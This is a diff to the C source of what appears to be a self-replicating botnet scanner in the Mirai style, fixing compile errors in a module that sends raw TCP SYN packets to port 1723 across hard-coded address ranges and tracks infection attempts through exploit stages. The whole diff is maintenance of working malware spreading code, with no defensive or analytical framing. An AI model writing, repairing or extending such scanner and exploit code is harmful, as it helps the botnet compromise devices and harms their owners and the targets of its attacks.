@@ -16,8 +16,6 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 #include "includes.h"
 #include "selfrep_netlink.h"
@@ -29,7 +27,7 @@
 int netlink_scanner_pid = 0, netlink_rsck = 0, netlink_rsck_out = 0, netlink_auth_table_len = 0;
 char netlink_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
 struct netlink_scanner_auth *netlink_auth_table = NULL;
-struct netlink_scanner_connection *conn_table;
+static struct netlink_scanner_connection *conn_table;
 uint16_t netlink_netlink_auth_table_max_weight = 0;
 uint32_t netlink_fake_time = 0;
 int netlink_range[] = {181,178,62,213,178,170,181,101,119};
@@ -66,7 +64,6 @@ void netlink_scanner(void)
     if(netlink_scanner_pid > 0 || netlink_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     netlink_fake_time = time(NULL);
@@ -153,7 +150,7 @@ void netlink_scanner(void)
                 tcph->dest = htons(1723);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -227,7 +224,7 @@ void netlink_scanner(void)
             int timeout = 5;
 
             conn = &conn_table[i];
-            //timeout = (conn->state > netlink_netlink_SC_CONNECTING ? 30 : 5);
+            //timeout = (conn->state > netlink_SC_CONNECTING ? 30 : 5);
 
             if(conn->state != netlink_SC_CLOSED && (netlink_fake_time - conn->last_recv) > timeout)
             {
@@ -245,7 +242,7 @@ void netlink_scanner(void)
                 continue;
             }
 
-            if(conn->state == netlink_netlink_SC_CONNECTING || conn->state == netlink_SC_EXPLOIT_STAGE2 || conn->state == netlink_SC_EXPLOIT_STAGE3)
+            if(conn->state == netlink_SC_CONNECTING || conn->state == netlink_SC_EXPLOIT_STAGE2 || conn->state == netlink_SC_EXPLOIT_STAGE3)
             {
                 FD_SET(conn->fd, &fdset_wr);
                 if(conn->fd > mfd_wr)
@@ -489,7 +486,7 @@ static void netlink_setup_connection(struct netlink_scanner_connection *conn)
     }
     else
     {
-        conn->state = netlink_netlink_SC_CONNECTING;
+        conn->state = netlink_SC_CONNECTING;
     }
 
     connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
